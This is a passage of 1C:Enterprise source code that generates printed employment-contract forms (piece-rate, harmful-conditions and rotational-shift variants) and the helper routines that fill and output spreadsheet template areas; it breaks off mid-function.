Функция ПФ_MXL_ТрудовойДоговорСдельныеРасценки(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорСдельныеРасценки;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорСдельныеРасценки"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорСдельныеРасценки_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорСдельныеРасценки = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорСдельныеРасценки;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорСдельныеРасценки

// private
Функция ПФ_MXL_ТрудовойДоговорСдельныеРасценки_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорСдельныеРасценки"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорВредники

// public
Процедура ПФ_MXL_ТрудовойДоговорВредники_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорВредники_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредники_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""вахтовый метод работы, продолжительность вахты составляет 2 месяца, продолжительность междувахтового отдыха составляет 1 месяц. Характер работы – разъездной"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");
	
	ЗначенияПараметров.Вставить(""УсловияТрудаНаРабочемМесте_Вид"", ""во вредных условиях труда (3 класс)"");

	ПФ_MXL_ТрудовойДоговорВредники_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорВредники_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорВредники_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредники_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорВредники_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорВредники_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорВредники_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорВредники(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредники;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорВредники"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорВредники_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорВредники = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорВредники;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорВредники

// private
Функция ПФ_MXL_ТрудовойДоговорВредники_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорВредники"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти
#Область class_ПФ_MXL_ТрудовойДоговорВредникиЛьготники

// public
Процедура ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОписанияОбластей, ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	
	ЗначенияПараметров = ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Макет, Данные);
	//ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", Данные.Сотрудник.ГрафикРаботы);
	ЗначенияПараметров.Вставить(""Сотрудник_ГрафикРаботы"", ""вахтовый метод работы, продолжительность вахты составляет 2 месяца, продолжительность междувахтового отдыха составляет 1 месяц. Работнику устанавливается сокращенная 36-ти часовая рабочая неделя"");
	ЗначенияПараметров.Вставить(""ОплатаТруда_Форма"", ""повременно-премиальная форма оплаты труда"");
	
	ЗначенияПараметров.Вставить(""УсловияТрудаНаРабочемМесте_Вид"", ""во вредных условиях труда (3 класс)"");

	ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ЗначенияПараметров = ЗначенияПараметров;       
	
	Возврат ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ЗначенияПараметров;                  
	
КонецФункции                                                                                        
Функция ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ОписаниеОбластей(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ОписаниеОбластей;
	
	ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ОписаниеОбластей = ПФ_MXL_ТрудовойДоговор_ОписаниеОбластей(this);

	#Область ПФ_MXL_ТрудовойДоговорВредникиЛьготники_Области
	
	#КонецОбласти
	
	Возврат ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ОписаниеОбластей;
	
КонецФункции 
Функция ПФ_MXL_ТрудовойДоговорВредникиЛьготники(Знач this) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговорВредникиЛьготники;
	
	ООП_parent(this);
	
	this.Имя = ""ПФ_MXL_ТрудовойДоговорВредникиЛьготники"";
	this.Тип = ""MXL"";
	this.Области = ПФ_MXL_ТрудовойДоговорВредникиЛьготники_ОписаниеОбластей(this);
	
	ПФ_MXL_ТрудовойДоговорВредникиЛьготники = this;
	
	Возврат ПФ_MXL_ТрудовойДоговорВредникиЛьготники;
	
КонецФункции //ПФ_MXL_ТрудовойДоговорВредникиЛьготники

// private
Функция ПФ_MXL_ТрудовойДоговорВредникиЛьготники_Include()
	
	ООП_Include(""ПФ_MXL_ТрудовойДоговор"");
	
	ООП_ЗарегистрироватьКласс(""ПФ_MXL_ТрудовойДоговорВредникиЛьготники"", ""Структура"", ""Макет.Макет"");
	
КонецФункции

#КонецОбласти

#Область class_МакетыИДанные

// public
Функция МакетыИДанные_Создать(МакетыИДанные, Знач Объекты, Знач ИменаМакетов) Экспорт
	
	Для Каждого ОбъектСсылка Из Объекты Цикл
		
		ДанныеОбъекта = МакетыИДанные_ДанныеОбъекта(ОбъектСсылка, ИменаМакетов);
		
		ДанныеОбъектаПоМакетам = Новый Соответствие;
		Для Каждого ИмяМакета Из ИменаМакетов Цикл
			ДанныеОбъектаПоМакетам.Вставить(ИмяМакета, МакетыИДанные_ЗначенияПараметровМакета(ДанныеОбъекта, ИмяМакета));
		КонецЦикла;
		
		МакетыИДанные.Данные.Вставить(ОбъектСсылка, ДанныеОбъектаПоМакетам);
	КонецЦикла;
	
	Для Каждого ИмяМакета Из ИменаМакетов Цикл
		
		Макет = ООП_Новый(ИмяМакета);
		Макет_Макет_Создать(Макет, ИмяМакета);
		
		МакетыИДанные.Макеты.ИсточникиМакетов.Вставить(ИмяМакета, Макет.Источник);
		МакетыИДанные.Макеты.ТипыМакетов.Вставить(ИмяМакета, Макет.Тип);
		МакетыИДанные.Макеты.ОбластиМакетов.Вставить(ИмяМакета, Макет.Области);
		
	КонецЦикла;
	
	Возврат МакетыИДанные;
	
КонецФункции
Функция МакетыИДанные_ПечатьМакетаОбъекта(МакетыИДанные, Знач ОбъектСсылка, Знач ИмяМакета) Экспорт
	
	ЗначенияПараметровМакета  = МакетыИДанные.Данные[ОбъектСсылка][ИмяМакета];
	ИсточникМакета            = МакетыИДанные.Макеты.ИсточникиМакетов[ИмяМакета];
	ТипМакета                 = МакетыИДанные.Макеты.ТипыМакетов[ИмяМакета];
	ОбластиМакета             = МакетыИДанные.Макеты.ОбластиМакетов[ИмяМакета];
	
	Если ( ( ""DOC"" = ТипМакета )
		ИЛИ ( ""ODT"" = ТипМакета ) ) Тогда
		//МакетыИДанные_ВОфисныйДокумент(ЗначенияПараметровМакета, ИмяМакета, ИсточникМакета, ТипМакета, ОбластиМакета);
		Возврат Неопределено;
	Иначе
		Возврат МакетыИДанные_ВТабличныйДокумент(ЗначенияПараметровМакета, ИмяМакета, ИсточникМакета, ТипМакета, ОбластиМакета);
	КонецЕсли; 
	
КонецФункции
//Функция МакетыИДанные_ВОфисныйДокумент(Знач ЗначенияПараметровМакета, Знач ИмяМакета, Знач ИсточникМакета, Знач ТипМакета, Знач ОбластиМакета) Экспорт
//	
//	// Для бибилиотеки стандартных подсистем <= 2.1 
//	Макет = УправлениеПечатьюКлиент.ИнициализироватьМакет(ИсточникМакета, ТипМакета, , ИмяМакета);
//	Макет = УправлениеПечатьюВызовСервера.ИнициализироватьМакет(ИсточникМакета, ТипМакета, , ИмяМакета);
//	// Для бибилиотеки стандартных подсистем > 2.1 
//	// Макет = УправлениеПечатьюКлиент.ИнициализироватьМакетОфисногоДокумента(ИсточникМакета, ТипМакета, ИмяМакета);
//	
//	Если Макет = Неопределено Тогда
//		Возврат Неопределено;
//	КонецЕсли;
//	
//	ЗакрытьОкноПечатнойФормы = Ложь;
//	Попытка
//		ПечатнаяФорма = УправлениеПечатьюКлиент.ИнициализироватьПечатнуюФорму(ТипМакета, Макет.НастройкиСтраницыМакета);
//		Если Неопределено = ПечатнаяФорма Тогда
//			УправлениеПечатьюКлиент.ОчиститьСсылки(Макет);
//			Возврат Неопределено;
//		КонецЕсли;
//		
//		Макет_Макет_ВОфисныйДокумент(ЗначенияПараметровМакета, ИмяМакета, Макет, ОбластиМакета, ПечатнаяФорма);
//		
//		УправлениеПечатьюКлиент.ПоказатьДокумент(ПечатнаяФорма);
//	Исключение
//		ОбщегоНазначенияКлиентСервер.СообщитьПользователю(КраткоеПредставлениеОшибки(ИнформацияОбОшибке()));
//		ЗакрытьОкноПечатнойФормы = Истина;
//	КонецПопытки;
//	
//	УправлениеПечатьюКлиент.ОчиститьСсылки(ПечатнаяФорма, ЗакрытьОкноПечатнойФормы);
//	УправлениеПечатьюКлиент.ОчиститьСсылки(Макет);
//	
//	Возврат Неопределено;
//КонецФункции
Функция МакетыИДанные_ВТабличныйДокумент(Знач ЗначенияПараметровМакета, Знач ИмяМакета, Знач ИсточникМакета, Знач ТипМакета, Знач ОбластиМакета) Экспорт
	
	Перем МакетыИДанные_ВТабличныйДокумент;
	
	Если ( Тип(""ТабличныйДокумент"") = ТипЗнч(ИсточникМакета) ) Тогда
		Макет = ИсточникМакета;
	Иначе
		Макет = ПолучитьМакет(ИмяМакета);
	КонецЕсли; 
	
	Если Макет = Неопределено Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	ПечатнаяФорма = Новый ТабличныйДокумент;
	
	Макет_Макет_ВТабличныйДокумент(ЗначенияПараметровМакета, ИмяМакета, Макет, ОбластиМакета, ПечатнаяФорма);
	
	МакетыИДанные_ВТабличныйДокумент = ПечатнаяФорма;
	Возврат МакетыИДанные_ВТабличныйДокумент;
	
КонецФункции
// protected
Функция МакетыИДанные(Знач МакетыИДанные)
	
	Перем Макеты, Данные;
	
	//-------------------------------------------------------------
	// Макеты
	
	Макеты = Новый Структура;
	Макеты.Вставить(""ИсточникиМакетов"", Новый Соответствие());
	Макеты.Вставить(""ТипыМакетов"", Новый Структура());
	Макеты.Вставить(""ОбластиМакетов"", Новый Структура());
	
	//-------------------------------------------------------------
	// Данные
	Данные = Новый Соответствие;
	
	//МакетыИДанные = Новый Структура;
	МакетыИДанные.Вставить(""Макеты"", Макеты);
	МакетыИДанные.Вставить(""Данные"", Данные);
	
	Возврат МакетыИДанные;
	
КонецФункции
Функция МакетыИДанные_Include()
	
	Перем МакетыИДанные_Include;
	
	ООП_ЗарегистрироватьКласс(""МакетыИДанные"", ""Структура"");
	
	Возврат МакетыИДанные_Include;
	
КонецФункции
// private
Функция МакетыИДанные_ДанныеОбъекта(Знач ОбъектСсылка, Знач ИменаМакетов)
	
	Перем МакетИДанные_ДанныеОбъекта; // Возвращаемое значение
	
	ПолноеИмяКласса = Метаданные.НайтиПоТипу(ТипЗнч(ОбъектСсылка)).ПолноеИмя();
	ДанныеОбъекта = ООП_Новый(ПолноеИмяКласса);
	Код = ""МакетИДанные_ДанныеОбъекта = "" + СтрЗаменить(ПолноеИмяКласса, ""."", ""_"") + ""_Создать(ДанныеОбъекта, ОбъектСсылка, ИменаМакетов);"";
	Выполнить(Код);
	
	Возврат МакетИДанные_ДанныеОбъекта;
	
КонецФункции // МакетИДанные_ДанныеОбъекта
Функция МакетыИДанные_ЗначенияПараметровМакета(Знач ДанныеОбъекта, Знач ИмяМакета)
	
	Перем МакетИДанные_ЗначенияПараметровМакета; // Возвращаемое значение
	
	Код = ""МакетИДанные_ЗначенияПараметровМакета = "" + ИмяМакета + ""_ЗначенияПараметров(ИмяМакета, ДанныеОбъекта)"";
	Выполнить(Код);
	
	Возврат МакетИДанные_ЗначенияПараметровМакета;
	
КонецФункции // МакетИДанные_ЗначенияПараметровМакета

#КонецОбласти //class_МакетыИДанные//
#Область namespace_Макет

#Область ШаблонОписанияМакета

//#Область class_<ИмяМакета>
//
//Процедура Макет_<ИмяМакета>_Include()
//	
//	namespace = ""Макет"";
//	classname = <ИмяМакета>;
//	
//	#Область class_<ИмяМакета>_Области
//	
//	ОписаниеОбластей = Новый Структура;
//	
//	<ОписаниеПараметровОбластиМакета_1>
//	<ОписаниеПараметровОбластиМакета_2>
//	.....
//	<ОписаниеПараметровОбластиМакета_N>
//	
//	#КонецОбласти //class_<ИмяМакета>_Области//
//	
//	Макет      = ООП_Новый(""Макет.Макет"");
//	Макет.Имя      = classname;
//	Макет.Тип      = <ТипМакета>;
//	Макет.Области  = ОписаниеОбластей;
//	
//	ООП_ЗарегистрироватьКласс(classname, namespace, Новый ФиксированнаяСтруктура(Макет));
//
//КонецПроцедуры
//
//#КонецОбласти //class_<ИмяМакета>//

#КонецОбласти //ШаблонОписанияМакета//
#Область ШаблонОписанияПараметровОбластиМакета

//#Область class_<ИмяМакета>_Область_<ИмяОбласти>
//
// ИмяОбласти        = <ИмяОбласти>
// ТипОбласти        = <ТипОбласти>
// ПараметрыОбласти  = Новый Массив;
//
// ПараметрыОбласти.Добавить(<ИмяПараметра>);
// Макеты_Макет_ДобавитьОписаниеОбласти(ОписаниеОбластей, ИмяОбласти, ТипОбласти, ПараметрыОбласти);
//
//#КонецОбласти //class_<ИмяМакета>_Область_<ИмяОбласти>//

#КонецОбласти //#Область ШаблонОписанияПараметровОбластиМакета

#Область class_Макет

// public
Функция Макет_Макет_Создать(Макет, Знач ИмяМакета = Неопределено, Знач ТипМакета = Неопределено)
	
	Если ( Неопределено = Макет ) Тогда
		Возврат Неопределено;
	КонецЕсли; 
	
	Если ( Неопределено = Макет.Имя ИЛИ """" = Макет.Имя ) Тогда
		Если ( Неопределено = ИмяМакета ИЛИ """" = ИмяМакета ) Тогда
			ВызватьИсключение ""Не задано имя макета"";
		Иначе
			Макет.Имя = ИмяМакета;
		КонецЕсли;
	КонецЕсли;
	
	Если ( Неопределено = Макет.Тип ИЛИ """" = Макет.Тип ) Тогда
		Макет.Тип = ТипМакета;
	КонецЕсли; 
	
	Если ( Неопределено = Макет.Источник ) Тогда
		Если ( Макет.Общий ) Тогда
			Макет.Источник  = ПолучитьОбщийМакет(Макет.Имя);
		Иначе
			Макет.Источник  = ЭтотОбъект.ПолучитьМакет(Макет.Имя);
		КонецЕсли; 
	КонецЕсли; 
	
	Если ( Неопределено = Макет.Области ) Тогда
		Макет.Области   = ООП_Новый(""Макеты."" + Макет.Имя + "".Области"");
	КонецЕсли; 
	
	Возврат Макет;
	
КонецФункции
//Процедура Макет_Макет_ВОфисныйДокумент(ЗначенияПараметровМакета, Знач ИмяМакета, Знач Макет, Знач ОбластиМакета, Знач ПечатнаяФорма) Экспорт
//	
//	Перем Область, ОписаниеОбласти, Параметры, ПараметрыОбласти;
//	
//	Выполнить(""Макет_"" + ИмяМакета + ""_ВОфисныйДокумент(ЗначенияПараметровМакета, Макет, ОбластиМакета, ПечатнаяФорма)"");
//	
//КонецПроцедуры
//Процедура Макет_Макет_ВОфисныйДокумент_ПрисоединитьОбластьИЗаполнитьПараметры(ЗначенияПараметровМакета, Знач Макет, Знач ОписаниеОбласти, Знач ПечатнаяФорма) Экспорт
//	
//	Перем Область, ПараметрыОбласти;
//	
//	Область = УправлениеПечатьюКлиент.ПолучитьОбласть(Макет, ОписаниеОбласти);
//	
//	ЗначенияПараметровОбласти = Новый Структура;
//	Для каждого Параметр Из ОписаниеОбласти.ПараметрыОбласти Цикл
//		
//		Если ( ЗначенияПараметровМакета.Свойство(Параметр) ) Тогда
//			ЗначенияПараметровОбласти.Вставить(Параметр, ЗначенияПараметровМакета[Параметр]);	
//		КонецЕсли; 
//		
//	КонецЦикла; 
//	
//	УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ЗначенияПараметровОбласти, Ложь);
//	
//КонецПроцедуры
//Процедура Макет_Макет_ВОфисныйДокумент_ВывестиКоллекцию(ЗначенияПараметровМакета, Знач Макет, Знач ОписаниеОбласти, Знач ПечатнаяФорма) Экспорт
//КонецПроцедуры
Процедура Макет_Макет_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач ИмяМакета, Знач Макет, Знач ОбластиМакета, Знач ПечатнаяФорма) Экспорт
	
	Перем Область, ОписаниеОбласти, Параметры, ПараметрыОбласти;
	
	Выполнить(ИмяМакета + ""_ВТабличныйДокумент(ЗначенияПараметровМакета, Макет, ОбластиМакета, ПечатнаяФорма)"");
	
КонецПроцедуры

Функция Макет_Макет_ВТабличныйДокументПолучитьОбластьИЗаполнитьПараметры(Знач ЗначенияПараметровМакета, Знач Макет, Знач ОписаниеОбласти) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПолучитьОбласть;
	
	Перем Область;
	
	#Если (Сервер И НЕ Сервер) Тогда
		Макет = Новый ТабличныйДокумент;
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Область = ЭтотОбъект.Макет_Макет_ВТабличныйДокументПолучитьОбласть(Макет, ОписаниеОбласти);
	ЭтотОбъект.Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти(ЗначенияПараметровМакета, Область, ОписаниеОбласти);
	
	Макет_Макет_ВТабличныйДокументПолучитьОбласть = Область;
	
	Возврат Макет_Макет_ВТабличныйДокументПолучитьОбласть;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументПолучитьИВывестиОбласть(Знач Макет, Знач ОписаниеОбласти, Знач ПечатнаяФорма, Знач ВыводитьКонецСтраницы = Истина) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПолучитьИВывестиОбласть;
	Перем Область;
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Макет = Новый ТабличныйДокумент;
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Область = ЭтотОбъект.Макет_Макет_ВТабличныйДокументПолучитьОбласть(Макет, ОписаниеОбласти);
	Макет_Макет_ВТабличныйДокументПолучитьИВывестиОбласть = ЭтотОбъект.Макет_Макет_ВТабличныйДокументВывестиОбласть(ПечатнаяФорма, Область, ВыводитьКонецСтраницы);
	
	Возврат Макет_Макет_ВТабличныйДокументПолучитьИВывестиОбласть;
	
КонецФункции

Процедура Макет_Макет_ВТабличныйДокументПрисоединитьОбластьИЗаполнитьПараметры(Знач ЗначенияПараметровМакета, Знач Макет, Знач ОписаниеОбласти, Знач ПечатнаяФорма, Знач ВыводитьКонецСтраницы = Истина) Экспорт
	
	Перем Область;
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Макет = Новый ТабличныйДокумент;
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Область = Макет_Макет_ВТабличныйДокументПолучитьОбласть(Макет, ОписаниеОбласти);
	Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти(ЗначенияПараметровМакета, Область, ОписаниеОбласти);
	Макет_Макет_ВТабличныйДокументВывестиОбласть(ПечатнаяФорма, Область, ВыводитьКонецСтраницы);
	
КонецПроцедуры
Процедура Макет_Макет_ВТабличныйДокументПрисоединитьИЗаполнитьКоллекцию(КоллекцияЗначенийПараметров, Знач Макет, Знач ОписаниеОбласти, Знач ПечатнаяФорма) Экспорт
	
	Перем Область, ПараметрыОбласти;
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Макет = Новый ТабличныйДокумент;
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Область = Макет.ПолучитьОбласть(ОписаниеОбласти.ИмяОбласти);
	
	ЗначенияПараметровОбласти = Новый Структура;
	
	Для каждого СтрокаКоллекцииЗначений Из КоллекцияЗначенийПараметров Цикл
		
		Для каждого Параметр Из ОписаниеОбласти.ПараметрыОбласти Цикл
			
			Если ( СтрокаКоллекцииЗначений.Свойство(Параметр) ) Тогда
				ЗначенияПараметровОбласти.Вставить(Параметр, СтрокаКоллекцииЗначений[Параметр]);	
			КонецЕсли; 
			
		КонецЦикла; 
		ЗаполнитьЗначенияСвойств(Область.Параметры, ЗначенияПараметровОбласти);
		
		ПечатнаяФорма.Вывести(Область);
		
	КонецЦикла; 
	
КонецПроцедуры

Функция Макет_Макет(Знач Макет_Макет)
	
	Макет_Макет.Вставить(""Имя"", """");
	Макет_Макет.Вставить(""Тип"", ""MXL"");   // MXL - документ типа ""ТабличныйДокумент"", DOC - документ MSOffice, ODT - документ OpenOffice
	Макет_Макет.Вставить(""Общий"", Ложь); // Истина - Общий макет, Ложь - макет объекта
	Макет_Макет.Вставить(""Источник"");
	Макет_Макет.Вставить(""Области"");
	
	Возврат Макет_Макет;
	
КонецФункции // Макет_Макет
Функция Макет_Макет_Include()
	
	Перем Макет_Макет_Include;
	
	ООП_ЗарегистрироватьКласс(""Макет.Макет"", ""Структура"");
	
	Возврат Макет_Макет_Include;
	
КонецФункции

// protected
Функция Макет_Макет_ДобавитьОписаниеОбласти(Знач ОписаниеОбластей, Знач ИмяОбласти, Знач ТипОбласти, Знач ПараметрыОбласти = Неопределено) Экспорт
	
	Перем ОписаниеОбласти;
	
	УправлениеПечатью.ДобавитьОписаниеОбласти(ОписаниеОбластей, ИмяОбласти, ТипОбласти);
	
	ОписаниеОбласти = ОписаниеОбластей[ИмяОбласти];
	ОписаниеОбласти.Вставить(""ПараметрыОбласти"", ?(Неопределено = ПараметрыОбласти, Новый Массив, ПараметрыОбласти));
	
	Возврат ОписаниеОбласти;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументПолучитьОбласть(Знач Макет, Знач ОписаниеОбласти) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПолучитьОбласть;
	
	Перем Область, ПараметрыОбласти;
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Макет = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Область = Макет.ПолучитьОбласть(ОписаниеОбласти.ИмяОбласти);
	
	Макет_Макет_ВТабличныйДокументПолучитьОбласть = Область;
	
	Возврат Макет_Макет_ВТабличныйДокументПолучитьОбласть;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти(Знач ЗначенияПараметровМакета, Знач Область, Знач ОписаниеОбласти) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти;
	
	Перем ЗначенияПараметровОбласти;
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Область = Новый ТабличныйДокумент;
	#КонецЕсли
	
	ЗначенияПараметровОбласти = Новый Структура;
	Для каждого Параметр Из ОписаниеОбласти.ПараметрыОбласти Цикл
		
		Если ( ЗначенияПараметровМакета.Свойство(Параметр) ) Тогда
			ЗначенияПараметровОбласти.Вставить(Параметр, ЗначенияПараметровМакета[Параметр]);	
		КонецЕсли; 
		
	КонецЦикла; 
	ЗаполнитьЗначенияСвойств(Область.Параметры, ЗначенияПараметровОбласти);
	
	
	Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти = Область;
	
	Возврат Макет_Макет_ВТабличныйДокументЗаполнитьПараметрыОбласти;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументВывестиОбласть(Знач ПечатнаяФорма, Знач Область, Знач ВыводитьКонецСтраницы = Истина) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументВывестиОбласть; // Возвращаемое значение
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		Область = Новый ТабличныйДокумент;
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Если ( ВыводитьКонецСтраницы ) Тогда
		Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы(ПечатнаяФорма, Область);
	КонецЕсли;
	
	ПечатнаяФорма.Вывести(Область);
	
	Макет_Макет_ВТабличныйДокументВывестиОбласть = ПечатнаяФорма;
	
	Возврат Макет_Макет_ВТабличныйДокументВывестиОбласть;
	
КонецФункции // Макет_Макет_ВТабличныйДокументВывестиОюбласть()

Функция Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы(Знач ПечатнаяФорма, Знач Область, Знач ВыводитьКонецСтраницы = Истина) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы; // Возвращаемое значение
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Если ( НЕ Макет_Макет_ВТабличныйДокументПроверитьВыводОбласти(ПечатнаяФорма, Область) ) Тогда
		Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы = Ложь;
	Иначе
		Если ( ВыводитьКонецСтраницы ) Тогда
			Макет_Макет_ВТабличныйДокументВставитьКонецСтраницы(ПечатнаяФорма);
		КонецЕсли;
		Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы = Истина;
	КонецЕсли;
	
	Возврат Макет_Макет_ВТабличныйДокументПроверитьВыводОбластиИВывестиКонецСтраницы;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументПроверитьВыводОбласти(Знач ПечатнаяФорма, Знач Область, Знач РезультатПриОшибке = Истина) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПроверитьВывод; // Возвращаемое значение
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Попытка
		Макет_Макет_ВТабличныйДокументПроверитьВывод = ПечатнаяФорма.ПроверитьВывод(Область);
	Исключение
		
		Макет_Макет_ВТабличныйДокументПроверитьВывод = РезультатПриОшибке;
		ВызватьИсключение ""Ошибка при проверке вывода в таблычный документ""; // TODO: первого случая... чтоб понимть в каком случае вызникает. После 
		
	КонецПопытки;
	
	Возврат Макет_Макет_ВТабличныйДокументПроверитьВывод;
	
КонецФункции
Функция Макет_Макет_ВТабличныйДокументПроверитьВыводОбластей(Знач ПечатнаяФорма, Знач Области, Знач РезультатПриОшибке = Истина) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументПроверитьВывод; // Возвращаемое значение
	
	#Если Не (НаКлиенте ИЛИ НаСервере ИЛИ ТолстыйКлиентОбычноеПриложение ИЛИ ТолстыйКлиентУправляемоеПриложение ИЛИ Клиент ИЛИ Сервер ИЛИ ВнешнееСоединение) Тогда
